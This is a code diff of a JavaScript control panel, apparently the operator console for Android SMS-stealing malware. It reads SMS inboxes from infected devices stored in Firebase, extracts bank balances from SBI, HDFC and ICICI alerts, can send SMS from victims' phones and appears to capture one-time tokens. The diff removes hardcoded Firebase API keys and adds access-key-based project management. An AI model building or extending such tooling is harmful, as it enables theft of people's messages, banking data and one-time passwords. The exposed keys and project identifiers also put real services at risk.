@@ -1,4 +1,4 @@
-var PANEL_BUILD=12;
+var PANEL_BUILD=15;
 var AUTH_URL='';
 var SMS_TOKEN_URL='';
 var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
@@ -6,7 +6,10 @@ var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var activeListeners={}, window_sms=[], window_banks=[];
 var _smsLoadedDev='', _smsDataHash='', _smsRenderTimer=0, _bankDataHash='';
 var ACTIVE_FB_KEY='rbl_active_fb_m';
-var CLIENTS_CACHE_KEY='rbl_clients_cache_v2';
+var ACCESS_KEY_STORAGE='rbl_active_access_key';
+var FB_LIST_PREFIX='rbl_fb_list_';
+var FB_ACTIVE_PREFIX='rbl_fb_active_';
+var CLIENTS_CACHE_PREFIX='rbl_clients_cache_';
 var CLIENTS_CACHE_TTL=6*60*60*1000;
 var tabLoaded={};
 var _smsTokenLog=[];
@@ -14,16 +17,27 @@ var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','us
 var SUMMARY_NODES=['devices_status','clients'];
 var DEVICE_NODES=['devices','users','clients_list','online_devices'];
 
-var DEFAULT_FIREBASES=[
-  {id:'rabel_raand',name:'Rebel',schema:'rabel',apiKey:'AIzaSyB5Fmk4HgxDLmkfSegOW2TBdtJeCpM-nuw',authDomain:'rabel-raand.firebaseapp.com',databaseURL:'https://rabel-raand-default-rtdb.firebaseio.com',projectId:'rabel-raand',storageBucket:'rabel-raand.firebasestorage.app',messagingSenderId:'574630053774',appId:'1:574630053774:android:aa7475de67c935821806df'},
-  {id:'monster_green_c5e81',name:'Monster Green',schema:'rabel',apiKey:'AIzaSyBspKFI_F7hB-5hHJI0203786vXuCMMbM8',authDomain:'monster-green-c5e81.firebaseapp.com',databaseURL:'https://monster-green-c5e81-default-rtdb.firebaseio.com',projectId:'monster-green-c5e81',storageBucket:'monster-green-c5e81.firebasestorage.app',messagingSenderId:'411242045978',appId:'1:411242045978:android:1748043e0e030b348067a3'},
-  {id:'pmfg_ccccc',name:'PMFG',schema:'spinplay',apiKey:'AIzaSyBq_UQz4RtTsomqsWLA99ilqvrK14Okh9w',authDomain:'pmfg-ccccc.firebaseapp.com',databaseURL:'https://pmfg-ccccc-default-rtdb.firebaseio.com',projectId:'pmfg-ccccc'},
-  {id:'spinplay99',name:'SpinPlay99',schema:'spinplay',apiKey:'AIzaSyCsTa5oZOZ3XS7ZujbAl8JX1qPuUEP6P3I',authDomain:'spinplay99.firebaseapp.com',databaseURL:'https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'spinplay99',storageBucket:'spinplay99.firebasestorage.app',messagingSenderId:'8121733414',appId:'1:8121733414:web:04b9ae5df1b6bc413e31e7'},
-  {id:'nsx1_7f7aa',name:'NSX1',schema:'rabel',apiKey:'AIzaSyBnfbREOJVIVrN2K7KJX4TTPbKcMIFasDQ',authDomain:'nsx1-7f7aa.firebaseapp.com',databaseURL:'https://nsx1-7f7aa-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'nsx1-7f7aa',storageBucket:'nsx1-7f7aa.firebasestorage.app',messagingSenderId:'1025305009086',appId:'1:1025305009086:android:b3c3d28d5f6bf44f2b77ef'},
-  {id:'stormapk_9edea',name:'Storm APK',schema:'rabel',apiKey:'AIzaSyCuFRrF3_yxait_oOFkDxjdrsZkwno_Uy8',authDomain:'stormapk-9edea.firebaseapp.com',databaseURL:'https://stormapk-9edea-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'stormapk-9edea',storageBucket:'stormapk-9edea.firebasestorage.app',messagingSenderId:'353810391693',appId:'1:353810391693:android:291dcbff91823c3866f8c4'}
-];
-
 function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function normAccessKey(key){return String(key||'').toUpperCase().replace(/[^A-Z0-9\-]/g,'');}
+function getCurrentAccessKey(){
+  try{
+    if(window.RebelAndroid&&RebelAndroid.getAccessKey){
+      var bridgeKey=RebelAndroid.getAccessKey();
+      if(bridgeKey&&String(bridgeKey).length>3)return normAccessKey(bridgeKey);
+    }
+    var s=getSession();
+    if(s&&s.key)return normAccessKey(s.key);
+    return normAccessKey(localStorage.getItem(ACCESS_KEY_STORAGE)||'');
+  }catch(e){return '';}
+}
+function clientsCacheKey(){var k=getCurrentAccessKey();return k?CLIENTS_CACHE_PREFIX+k:'rbl_clients_cache_v2';}
+function maskAccessKey(key){
+  key=normAccessKey(key);
+  if(key.length<10)return key||'—';
+  return key.slice(0,8)+'••••';
+}
+function firebaseListStorageKey(){var k=getCurrentAccessKey();return k?FB_LIST_PREFIX+k:'';}
+function firebaseActiveStorageKey(){var k=getCurrentAccessKey();return k?FB_ACTIVE_PREFIX+k:ACTIVE_FB_KEY;}
 function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}
 
 /* ═══ ADVANCED FX ═══ */
@@ -120,14 +134,31 @@ function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){ret
 function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}
 
 function loadFirebaseConfigs(){
+  var storageKey=firebaseListStorageKey();
+  var seed=(typeof REBEL_DEFAULT_FIREBASES!=='undefined'&&REBEL_DEFAULT_FIREBASES.length)?REBEL_DEFAULT_FIREBASES:[];
+  if(!storageKey)return seed.slice();
   try{
-    var s=localStorage.getItem('rbl_firebase_list');
-    if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length){
-      DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
-      return p;
-    }}
+    var s=localStorage.getItem(storageKey);
+    if(s){
+      var p=JSON.parse(s);
+      if(Array.isArray(p)&&p.length){
+        seed.forEach(function(def){
+          if(!p.some(function(c){return c.id===def.id||normalizeFirebaseUrl(c.databaseURL)===normalizeFirebaseUrl(def.databaseURL);}))p.push(def);
+        });
+        p.forEach(function(c){
+          if(!c.schema)c.schema=(c.databaseURL||'').indexOf('rabel-raand')>=0?'rabel':'spinplay';
+          if(c.id==='rabel_raand'||(c.databaseURL||'').indexOf('rabel-raand')>=0)c.name='Rebel';
+        });
+        return p;
+      }
+    }
   }catch(e){}
-  return DEFAULT_FIREBASES.slice();
+  return seed.slice();
+}
+function saveFirebaseConfigs(){
+  var storageKey=firebaseListStorageKey();
+  if(!storageKey)return;
+  try{localStorage.setItem(storageKey,JSON.stringify(firebaseConfigs));}catch(e){}
 }
 function initFirebaseInstance(cfg){
   var appName='mfb_'+cfg.id,db=null;
@@ -144,11 +175,35 @@ function initFirebaseInstance(cfg){
 function initFirebase(){
   firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
   firebaseConfigs.forEach(initFirebaseInstance);
-  try{activeFbId=localStorage.getItem(ACTIVE_FB_KEY)||'';}catch(e){}
-  if(!activeFbId&&firebaseConfigs.length){var r=firebaseConfigs.find(function(c){return c.id==='rabel_raand';});activeFbId=r?r.id:firebaseConfigs[0].id;}
+  try{activeFbId=localStorage.getItem(firebaseActiveStorageKey())||'';}catch(e){activeFbId='';}
+  if(!activeFbId&&firebaseConfigs.length)activeFbId=firebaseConfigs[0].id;
   updateFbUi();
+  updateAccessKeyBadge();
 }
-initFirebase();
+function bindAccessKey(key){
+  key=normAccessKey(key);
+  if(!key)return;
+  try{localStorage.setItem(ACCESS_KEY_STORAGE,key);}catch(e){}
+  clearListeners();
+  selDev='';
+  tabLoaded={};
+  clientsRawMap={};
+  window_sms=[];
+  window_banks=[];
+  _smsLoadedDev='';
+  _smsDataHash='';
+  reloadFirebaseForAccessKey();
+}
+function reloadFirebaseForAccessKey(){
+  initFirebase();
+  if(panelReady)fetchAllData();
+}
+function updateAccessKeyBadge(){
+  var el=document.getElementById('accessKeyBadge');
+  if(!el)return;
+  var k=getCurrentAccessKey();
+  el.textContent=k?('Key: '+maskAccessKey(k)):'No access key';
+}
 
 function updateFbUi(){
   var inst=getFbInstance(activeFbId);
@@ -164,13 +219,131 @@ function updateFbUi(){
 }
 function switchFirebase(id){
   if(!getFbInstance(id))return;
-  activeFbId=id;try{localStorage.setItem(ACTIVE_FB_KEY,id);}catch(e){}
+  activeFbId=id;try{localStorage.setItem(firebaseActiveStorageKey(),id);}catch(e){}
   if(selDev){var d=getSelDev();if(!d||d.fbId!==id){selDev='';clearListeners();}}
   updateFbUi();renderDevices();renderDeviceView();renderSms();updateSendForm();
   closeFbSheet();toast('Switched to '+getFbInstance(id).name,true);
 }
 function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
 function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}
+function normalizeFirebaseUrl(raw){
+  if(!raw)return '';
+  var u=String(raw).trim().replace(/['"`<>]/g,'').replace(/[.,;]+$/,'');
+  u=u.replace(/\.json(\?.*)?$/i,'').replace(/\/+$/,'');
+  if(!/^https?:\/\//i.test(u)&&u.indexOf('.')>0)u='https://'+u;
+  if(!/firebaseio\.com|firebasedatabase\.app/i.test(u))return '';
+  return u.replace(/\/(clients|devices|messages|\.json).*$/i,'');
+}
+function projectIdFromUrl(url){
+  var m=String(url||'').match(/\/\/([a-z0-9-]+?)(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/i);
+  return m?m[1]:'';
+}
+function parseFirebaseFromText(text){
+  if(!text)return null;
+  var out={},t=String(text);
+  var urlM=t.match(/https?:\/\/[a-zA-Z0-9_.-]+\.(?:firebaseio\.com|firebasedatabase\.app)[^\s"'`,;)<>]*/i);
+  if(!urlM)urlM=t.match(/[a-zA-Z0-9_.-]+\.(?:firebaseio\.com|firebasedatabase\.app)[^\s"'`,;)<>]*/i);
+  if(urlM)out.databaseURL=normalizeFirebaseUrl(urlM[0]);
+  var apiM=t.match(/apiKey\s*[:=]\s*["']?(AIza[A-Za-z0-9_-]{20,})/i)||t.match(/\b(AIza[A-Za-z0-9_-]{20,})\b/);
+  if(apiM)out.apiKey=(apiM[1]||apiM[0]).trim();
+  var nameM=t.match(/(?:name|project\s*name)\s*[:=]\s*["']?([^"'\n,]+)/i);
+  if(nameM)out.name=nameM[1].trim();
+  var projM=t.match(/projectId\s*[:=]\s*["']?([a-zA-Z0-9_-]+)/i);
+  if(projM)out.projectId=projM[1];
+  if(out.databaseURL){
+    if(!out.projectId)out.projectId=projectIdFromUrl(out.databaseURL);
+    if(!out.authDomain&&out.projectId)out.authDomain=out.projectId+'.firebaseapp.com';
+  }
+  return out.databaseURL?out:null;
+}
+function detectFbSchema(url,roots){
+  if((url||'').indexOf('rabel-raand')>=0)return 'rabel';
+  if(roots&&typeof roots==='object'){
+    var n=Object.keys(roots);
+    if(n.indexOf('clients')>=0&&n.indexOf('messages')>=0)return 'rabel';
+    if(n.indexOf('devices')>=0)return 'spinplay';
+  }
+  return 'spinplay';
+}
+function testFirebaseRoots(url){
+  var base=String(url||'').replace(/\/+$/,'').replace(/\.json(\?.*)?$/i,'');
+  return fetch(base+'/.json?shallow=true',{cache:'no-store'}).then(function(r){
+    return r.json().then(function(data){
+      if(data&&data.error)throw new Error(String(data.error));
+      if(!r.ok)throw new Error('Firebase not reachable (HTTP '+r.status+')');
+      return data;
+    });
+  });
+}
+function makeFbId(name){return String(name||'fb').toLowerCase().replace(/[^a-z0-9]+/g,'_').slice(0,20)+'_'+Date.now().toString(36);}
+function addFirebaseFromConfig(cfg){
+  if(!getCurrentAccessKey())return Promise.reject(new Error('Login with your access key first'));
+  var url=normalizeFirebaseUrl(cfg.databaseURL||'');
+  if(!url)return Promise.reject(new Error('Valid Firebase database URL required'));
+  var existing=firebaseConfigs.find(function(c){return normalizeFirebaseUrl(c.databaseURL)===url;});
+  if(existing){switchFirebase(existing.id);return Promise.resolve({ok:true,already:true,name:existing.name,id:existing.id});}
+  return testFirebaseRoots(url).then(function(roots){
+    if(!roots||typeof roots!=='object')throw new Error('Firebase returned empty data');
+    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
+    if(!nodes.length)throw new Error('No device nodes found in this Firebase');
+    var schema=cfg.schema||detectFbSchema(url,roots);
+    var name=cfg.name||projectIdFromUrl(url)||'Firebase Project';
+    var pid=cfg.projectId||projectIdFromUrl(url)||makeFbId(name);
+    var id=cfg.id||pid;
+    if(firebaseConfigs.some(function(c){return c.id===id;}))id=makeFbId(name);
+    var fullCfg={id:id,name:name,databaseURL:url,apiKey:cfg.apiKey||'',authDomain:cfg.authDomain||(pid+'.firebaseapp.com'),projectId:pid,schema:schema,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''};
+    firebaseConfigs.push(fullCfg);
+    saveFirebaseConfigs();
+    initFirebaseInstance(fullCfg);
+    switchFirebase(fullCfg.id);
+    if(panelReady)fetchAllData();
+    toast('Firebase connected: '+name,true);
+    renderFirebaseManagerList();
+    return {ok:true,name:name,nodes:nodes,id:fullCfg.id};
+  });
+}
+function removeFirebaseProject(id){
+  if(!confirm('Remove this Firebase project from your key?'))return;
+  firebaseConfigs=firebaseConfigs.filter(function(c){return c.id!==id;});
+  saveFirebaseConfigs();
+  Object.keys(clientsRawMap).forEach(function(k){if(k.indexOf(id+'::')===0)delete clientsRawMap[k];});
+  clearListeners();
+  initFirebase();
+  if(panelReady)fetchAllData();
+  renderFirebaseManagerList();
+  toast('Firebase removed',true);
+}
+function openFirebaseManager(){
+  if(!getCurrentAccessKey()){toast('Login with your access key first',false);return;}
+  renderFirebaseManagerList();
+  document.getElementById('firebaseModal').classList.remove('hidden');
+}
+function closeFirebaseModal(e){
+  if(e&&e.target!==document.getElementById('firebaseModal'))return;
+  document.getElementById('firebaseModal').classList.add('hidden');
+}
+function renderFirebaseManagerList(){
+  var el=document.getElementById('fbManagerList');
+  if(!el)return;
+  if(!firebaseConfigs.length){
+    el.innerHTML='<div class="fb-empty">No Firebase projects for this key yet.</div>';
+    return;
+  }
+  el.innerHTML=firebaseConfigs.map(function(cfg){
+    var inst=getFbInstance(cfg.id);
+    var cnt=allDevs.filter(function(d){return d.fbId===cfg.id;}).length;
+    return '<div class="fb-manage-item"><div><div class="fb-manage-name">'+esc(cfg.name)+'</div><div class="fb-manage-meta">'+cnt+' devices · '+esc(cfg.schema||'auto')+'</div></div><button type="button" class="fb-manage-del" data-fb-id="'+esc(cfg.id)+'" onclick="removeFirebaseProject(this.getAttribute(\'data-fb-id\'))">Remove</button></div>';
+  }).join('');
+}
+function submitFirebasePaste(){
+  var raw=document.getElementById('fbPasteInput');
+  if(!raw)return;
+  var parsed=parseFirebaseFromText(raw.value||'');
+  if(!parsed){toast('Paste a valid Firebase URL or config JSON',false);return;}
+  addFirebaseFromConfig(parsed).then(function(){
+    raw.value='';
+  }).catch(function(err){toast(err.message||'Failed to connect Firebase',false);});
+}
 
 function getPhoneFromRecord(s){
   if(!s)return'';
@@ -246,7 +419,7 @@ function formatLastSeenAgo(ms){
   return Math.floor(sec/86400)+'d ago';
 }
 function getClientsCacheMeta(){
-  try{return JSON.parse(localStorage.getItem(CLIENTS_CACHE_KEY)||'null');}catch(e){return null;}
+  try{return JSON.parse(localStorage.getItem(clientsCacheKey())||'null');}catch(e){return null;}
 }
 function loadClientsCache(){
   var meta=getClientsCacheMeta();
@@ -272,7 +445,7 @@ function saveClientsCache(){
     var meta=getClientsCacheMeta()||{byFb:{}};
     if(!meta.byFb)meta.byFb={};
     meta.byFb[activeFbId]={ts:Date.now(),data:slice};
-    localStorage.setItem(CLIENTS_CACHE_KEY,JSON.stringify(meta));
+    localStorage.setItem(clientsCacheKey(),JSON.stringify(meta));
   }catch(e){}
 }
 function panelApiFetch(body){
@@ -456,7 +629,7 @@ function updatePanelVersionBadge(){
   if(window.RebelAndroid&&RebelAndroid.getPanelVersion){
     try{v=RebelAndroid.getPanelVersion()||v;}catch(e){}
   }
-  el.textContent='Panel v'+v+' · Bank SMS';
+  el.textContent='Panel v'+v+' · Key Firebase';
 }
 function updateStats(){
   var l=getFilteredDevs();
@@ -500,7 +673,15 @@ function fetchAllData(){
 }
 function startPanelPreload(){
   if(window._preloadStarted)return;
+  var key='';
+  if(window.RebelAndroid){
+    var sessionData=parseJson(RebelAndroid.checkSession());
+    if(sessionData&&sessionData.ok&&sessionData.key)key=normAccessKey(sessionData.key);
+    if(!key&&RebelAndroid.getAccessKey)key=normAccessKey(RebelAndroid.getAccessKey()||'');
+  }
+  if(!key)return;
   window._preloadStarted=true;
+  bindAccessKey(key);
   loadClientsCache();
   fetchAllData();
   loadAutoTokenState();
@@ -601,13 +782,28 @@ function clearListeners(){
   });
   activeListeners={};
 }
+var SMS_MONTHS={jan:0,feb:1,mar:2,apr:3,may:4,jun:5,jul:6,aug:7,sep:8,oct:9,nov:10,dec:11};
 function parseDdMmYyyy(s){
   if(!s||typeof s!=='string')return 0;
-  var m=String(s).trim().match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})(?:\s*[|\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?$/i);
+  var m=String(s).trim().match(/^(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{2,4})(?:[T\s,|]*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?/i);
   if(!m)return 0;
-  var dd=+m[1],MM=+m[2],yyyy=+m[3],hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
+  var dd=+m[1],MM=+m[2],yyyy=+m[3];
+  if(yyyy<100)yyyy+=2000;
+  var hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
   if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
   var ms=new Date(yyyy,MM-1,dd,hh,mi,ss).getTime();
+  return isNaN(ms)?0:ms;
+}
+function parseNamedMonthDate(s){
+  if(!s||typeof s!=='string')return 0;
+  var m=String(s).trim().match(/^(\d{1,2})[\s\/\-\.]+([A-Za-z]{3,9})[\s\/\-\.,]+(\d{2,4})(?:[,\s]+(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)?)?/i);
+  if(!m)return 0;
+  var mon=(SMS_MONTHS[String(m[2]).slice(0,3).toLowerCase()]);
+  if(mon==null)return 0;
+  var yyyy=+m[3];if(yyyy<100)yyyy+=2000;
+  var hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
+  if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
+  var ms=new Date(yyyy,mon,+m[1],hh,mi,ss).getTime();
   return isNaN(ms)?0:ms;
 }
 function smsToMs(v){
@@ -619,34 +815,57 @@ function smsToMs(v){
     if(!isNaN(t))return t;
     var d2=parseDdMmYyyy(v);
     if(d2)return d2;
+    d2=parseNamedMonthDate(v);
+    if(d2)return d2;
   }
   return 0;
 }
 function smsMsgTime(m){
   if(!m)return 0;
-  var keys=['date','timestamp','dateTime','datetime','time','time_ms','received_at','sent_at','created_at','receivedAt','sentAt','sms_time','msg_time','last_modified','received_time','sent_time','id'];
+  var keys=['date','timestamp','dateTime','datetime','time','time_ms','received_at','sent_at','created_at','receivedAt','sentAt','sms_time','msg_time','last_modified','received_time','sent_time','date_long','smsDate','msg_date','id'];
   var i,ms;
   for(i=0;i<keys.length;i++){ms=smsToMs(m[keys[i]]);if(ms)return ms;}
   ms=smsToMs(m._sortKey);
   if(ms)return ms;
-  return smsToMs(m.date_readable||m.dateTime||m.datetime||m.time||'');
+  return smsToMs(m.date_readable||m.dateTime||m.datetime||m.time||m.time_str||'');
+}
+function compareSortKeyDesc(a,b){
+  var sa=String(a||''),sb=String(b||'');
+  if(sa===sb)return 0;
+  var na=Number(sa),nb=Number(sb);
+  if(!isNaN(na)&&!isNaN(nb)&&/^\d+$/.test(sa)&&/^\d+$/.test(sb))return nb-na;
+  return sb.localeCompare(sa);
 }
 function sortSmsNewestFirst(list){
   if(!list||!list.length)return[];
   return list.slice().sort(function(a,b){
     var ta=a.date_ms||smsMsgTime(a)||0,tb=b.date_ms||smsMsgTime(b)||0;
     if(tb!==ta)return tb-ta;
-    return String(b._sortKey||'').localeCompare(String(a._sortKey||''));
+    var da=String(a.date_readable||''),db=String(b.date_readable||'');
+    if(da&&db&&da!=='—'&&db!=='—'&&da!==db)return db.localeCompare(da);
+    var sk=compareSortKeyDesc(a._sortKey,b._sortKey);
+    if(sk)return sk;
+    return (b._seq|0)-(a._seq|0);
   });
+}
+function finalizeSmsList(list){
+  if(!list||!list.length)return[];
+  var dated=0,i;
+  for(i=0;i<list.length;i++){if((list[i].date_ms||0)>0)dated++;}
+  if(dated<list.length*0.2){
+    for(i=0;i<list.length;i++){if(list[i]._seq==null)list[i]._seq=i;}
+    list.reverse();
+  }
+  return sortSmsNewestFirst(list);
 }
 function parseAllSmsPayload(data){
   if(!data)return[];
   var raw=data.messages!=null?data.messages:data;
-  return sortSmsNewestFirst(smsAsList(raw).map(normalizeSms).filter(Boolean));
+  return finalizeSmsList(smsAsList(raw).map(normalizeSms).filter(Boolean));
 }
 function parseNewSmsPayload(data){
   if(!data)return[];
-  return sortSmsNewestFirst(smsAsList(data).map(normalizeSms).filter(Boolean));
+  return finalizeSmsList(smsAsList(data).map(normalizeSms).filter(Boolean));
 }
 function mergeSmsLists(a,b){
   var seen={},out=[];
@@ -656,8 +875,8 @@ function mergeSmsLists(a,b){
       if(!seen[k]){seen[k]=1;out.push(m);}
     });
   }
-  add(a);add(b);
-  return sortSmsNewestFirst(out).slice(0,500);
+  add(b);add(a);
+  return finalizeSmsList(out).slice(0,500);
 }
 function applySmsList(list){
   var sorted=sortSmsNewestFirst(list||[]);
@@ -713,7 +932,12 @@ function loadSmsForDevice(force){
     var newRef=inst.db.ref(base+'/new_sms');
     var addH=function(s){
       var n=normalizeSms(s.val());
-      if(n){bags.new.push(n);mergeBags();}
+      if(n){
+        n._sortKey=s.key||n._sortKey||'';
+        n._seq=Date.now();
+        bags.new.push(n);
+        mergeBags();
+      }
     };
     newRef.on('child_added',addH);
     activeListeners['sms::new::'+d.id]={db:inst.db,ref:newRef,addH:addH};
@@ -735,16 +959,18 @@ function smsAsList(raw){
   if(Array.isArray(raw))return raw.map(function(x,i){
     if(!x||typeof x!=='object')return null;
     if(!x._sortKey)x._sortKey=String(i);
+    x._seq=i;
     return x;
   }).filter(Boolean);
   return Object.keys(raw).sort(function(a,b){
     var na=Number(a),nb=Number(b);
-    if(!isNaN(na)&&!isNaN(nb))return na-nb;
+    if(!isNaN(na)&&!isNaN(nb)&&/^\d+$/.test(a)&&/^\d+$/.test(b))return na-nb;
     return String(a).localeCompare(String(b));
-  }).map(function(k){
+  }).map(function(k,i){
     var x=raw[k];
     if(!x||typeof x!=='object')return null;
     if(!x._sortKey)x._sortKey=k;
+    x._seq=i;
     return x;
   }).filter(Boolean);
 }
@@ -754,8 +980,8 @@ function normalizeSms(m){
   if(!body)return null;
   var ts=smsMsgTime(m);
   return{address:m.address||m.sender||m.from||m.number||m.phone||m.mobNo||'?',body:body,
-    date_readable:m.date_readable||m.dateTime||m.datetime||m.time||m.received_at||'—',
-    date_ms:ts,_sortKey:m._sortKey||'',
+    date_readable:m.date_readable||m.dateTime||m.datetime||m.time||m.received_at||m.time_str||'—',
+    date_ms:ts,_sortKey:m._sortKey||'',_seq:m._seq!=null?m._seq:0,
     type:String(m.type||m.sms_type||m.direction||m.msg_type||'inbox').toLowerCase()};
 }
 function renderSmsFromData(data){applySmsList(parseAllSmsPayload(data));}
@@ -864,7 +1090,7 @@ function parseBankAccountsFromSms(smsList){
 function renderBankAccounts(){
   var d=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty'),badge=document.getElementById('bankCountBadge');
   if(!d){
-    if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>Select a device — SMS se bank balance auto load';}
+    if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>Select a device to load bank balances from SMS';}
     if(listEl)listEl.innerHTML='';if(badge)badge.textContent='0 Banks';return;
   }
   if(!window_sms.length&&_smsLoadedDev!==d.id)loadSmsForDevice();
@@ -874,7 +1100,7 @@ function renderBankAccounts(){
   _bankDataHash=bh;
   if(badge)badge.textContent=window_banks.length+' Bank'+(window_banks.length===1?'':'s');
   if(!window_banks.length){
-    if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>No bank SMS found<br><span style="font-size:11px;opacity:.6">SBI, HDFC, ICICI balance alerts yahan dikhenge</span>';}
+    if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>No bank SMS found<br><span style="font-size:11px;opacity:.6">SBI, HDFC, ICICI balance alerts appear here</span>';}
     if(listEl)listEl.innerHTML='';return;
   }
   if(emptyEl)emptyEl.classList.add('hidden');
@@ -896,13 +1122,17 @@ function renderSms(){
     if(el)el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';
     return;
   }
-  var show=sortSmsNewestFirst(window_sms).slice(0,120);
-  if(el)el.innerHTML=show.map(function(s){
+  var show=finalizeSmsList(window_sms).slice(0,120);
+  if(el){
+    el.innerHTML=show.map(function(s,i){
     var out=s.type==='sent'||s.type==='outbox';
     return '<div class="sms-bubble '+(out?'out':'in')+'">'+
       '<div class="sms-from">'+esc(s.address)+'</div>'+
       esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
-  }).join('');
+    }).join('');
+    var scr=el.closest('.screen');
+    if(scr)scr.scrollTop=0;
+  }
 }
 
 function sendSms(){
@@ -940,7 +1170,8 @@ function switchTab(name,btn){
     if(navBtn){navBtn.classList.add('active');moveNavGlow(navBtn);}
   }
   _lastTab=name;
-  if(name==='sms'||name==='bank')ensureSmsLoaded();
+  if(name==='sms'){window_sms=[];_smsDataHash='';loadSmsForDevice(true);}
+  else if(name==='bank')ensureSmsLoaded();
   if(name==='device')renderDeviceView();
   if(name==='send')updateSendForm();
 }
@@ -961,14 +1192,15 @@ function toggleSideMenu(){
 function menuGo(name){closeSideMenu();switchTab(name,null);}
 function menuDevTab(name){
   closeSideMenu();
-  if(!getSelDev()){toast('Pehle Home se device select karo',false);menuGo('home');return;}
+  if(!getSelDev()){toast('Select a device from Home first',false);menuGo('home');return;}
   switchTab('device',null);
   setTimeout(function(){
     var btn=document.querySelector('.dev-tab[data-tab="'+name+'"]');
     switchDevTab(name,btn);
   },40);
 }
-function menuOpenFb(){closeSideMenu();openFbSheet();}
+function menuOpenFb(){closeSideMenu();openFirebaseManager();}
+function menuSwitchFb(){closeSideMenu();openFbSheet();}
 function menuToggleAutoToken(){closeSideMenu();toggleAutoToken();}
 function menuSetAutoDevice(){closeSideMenu();useSelForAutoToken();}
 function menuOpenAadhar(){closeSideMenu();openAadhar();}
@@ -996,8 +1228,10 @@ function authFetch(body){
   });
 }
 function getSession(){try{return JSON.parse(localStorage.getItem('rbl_session')||sessionStorage.getItem('rbl_session')||'null');}catch(e){return null;}}
-function unlockApp(token,exp,remember){
-  var s={token:token,exp:exp||0};
+function unlockApp(token,exp,remember,accessKey){
+  var key=normAccessKey(accessKey||getCurrentAccessKey());
+  var s={token:token,exp:exp||0,key:key};
+  if(key)bindAccessKey(key);
   if(remember)localStorage.setItem('rbl_session',JSON.stringify(s));else sessionStorage.setItem('rbl_session',JSON.stringify(s));
   var login=document.getElementById('loginScreen'),app=document.getElementById('appShell');
   var btn=document.getElementById('loginBtn');
@@ -1023,7 +1257,7 @@ function doLogin(){
   btn.disabled=true;btn.classList.add('loading');
   authFetch({action:'login',key:key}).then(function(res){
     btn.disabled=false;btn.classList.remove('loading');
-    if(res.ok&&res.data&&res.data.ok){unlockApp(res.data.token,res.data.expires,document.getElementById('rememberMe').checked);return;}
+    if(res.ok&&res.data&&res.data.ok){unlockApp(res.data.token,res.data.expires,document.getElementById('rememberMe').checked,res.data.key||key);return;}
     errEl.textContent=res.data&&res.data.error||'Invalid key';
     errEl.style.display='block';
     errEl.classList.remove('shake');void errEl.offsetWidth;errEl.classList.add('shake');
@@ -1032,6 +1266,7 @@ function doLogin(){
 function doLogout(){
   if(window.RebelAndroid)RebelAndroid.logout();
   localStorage.removeItem('rbl_session');sessionStorage.removeItem('rbl_session');
+  localStorage.removeItem(ACCESS_KEY_STORAGE);
   location.reload();
 }
 document.getElementById('loginKey').addEventListener('input',function(){this.value=this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');});
@@ -1112,13 +1347,12 @@ function useSelForAutoToken(){
       sessionData=parseJson(RebelAndroid.checkSession());
       if(sessionData&&sessionData.ok&&sessionData.token){
         hasSession=true;
-        startPanelPreload();
       }
     }
     setTimeout(hideBoot,ms);
     setTimeout(initFx,ms);
     if(hasSession&&sessionData){
-      setTimeout(function(){unlockApp(sessionData.token,sessionData.expires||sessionData.exp||0,true);},ms);
+      setTimeout(function(){unlockApp(sessionData.token,sessionData.expires||sessionData.exp||0,true,sessionData.key);},ms);
     }
   });
 })();
